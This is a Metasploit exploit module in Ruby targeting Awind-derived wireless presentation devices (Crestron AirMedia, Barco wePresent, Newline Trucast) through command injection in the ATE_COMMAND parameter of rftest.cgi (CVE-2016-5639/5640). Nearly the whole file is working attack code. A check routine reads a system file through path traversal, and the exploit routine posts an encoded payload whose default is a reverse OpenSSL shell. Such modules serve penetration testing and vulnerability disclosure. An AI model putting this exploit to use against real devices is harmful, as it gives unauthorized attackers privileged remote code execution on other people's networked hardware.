##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "Awind and OEM'ed derivatives ATE_COMMAND Remote Code Injection",
      'Description'    => %q{
        This module exploits a vulnerability found in wireless presentation devices OEM'ed by Awind to
        different manufacturers such as Crestron, Barco, Newline, Extron, and Casio.

        The vulnerability lies in rftest.cgi where untrusted inputs from ATE_COMMAND POST parameter
        is fed to system command, leading to command injection.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Quentin Kaiser <kaiserquentin[at]gmail.com>', # Metasploit module
          'Cylance Vulnerability Research <vr@cylance.com>' # Initial discovery
        ],
      'References'     =>
        [
          ['CVE', '2016-5639'],
          ['CVE', '2016-5640'],
          ['URL', 'https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-001.md'],
          ['URL', 'https://github.com/CylanceVulnResearch/disclosures/blob/master/CLVA-2016-05-002.md']
        ],
      'Platform'        => 'unix',
      'Targets'         => [
        [ 'Crestron Airmedia AM-100 <= version 1.5.0.4', {} ],
        [ 'Crestron Airmedia AM-101 <= version 2.5.0.12', {} ],
        [ 'Awind WiPG-1600w <= version 2.0.1.8', {} ],
        [ 'Awind WiPG-2000d <= version 2.1.6.2', {} ],
        [ 'Barco wePresent 2000 <= version 2.1.5.7', {} ],
        [ 'Newline Trucast 2 <= version 2.1.0.5', {} ],
        [ 'Newline Trucast 3 <= version 2.1.3.7', {} ]
      ],
      'Privileged'     => true,
      'DefaultOptions' =>
      {
        'RPORT' => 443,
        'SSL' => true,
        'PAYLOAD' => 'cmd/unix/reverse_openssl'
      },
      'Arch'  => [ ARCH_CMD ],
      'Payload' =>
      {
        'Compat' =>
        {
          'PayloadType' => 'cmd',
          'RequiredCmd' => 'openssl'
        }
      },
      'DisclosureDate' => "Aug 8 2016",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptBool.new('SSL', [ true, 'Use SSL', true ]),
        OptString.new('TARGETURI', [true, 'The base path', '/']),
      ])
  end


  def check
    uri = target_uri.path
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri(uri, '/cgi-bin/login.cgi?lang=en&src=../../../../../../../../etc/sys.ver'),
    })
    # TODO: check which version fixed this issue
    if res and res.code == 200
      version = res.body.to_s.split("\n")[0]
      print_status("Version is #{version}")
      return Exploit::CheckCode::Vulnerable
    else
      return Exploit::CheckCode::Safe
    end
    Exploit::CheckCode::Unknown
  end

  def exploit
    uri = target_uri.path
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(uri, "/cgi-bin/rftest.cgi?lang=en&src=AwServicesSetup.html"),
      'ctype' => 'application/x-www-form-urlencoded',
      'vars_post' => {
        'ATE_COMMAND' => payload.encoded,
        'ATETXLEN' => 24,
        'ATE' => 'TXCONT'
      }
    })
  end
end
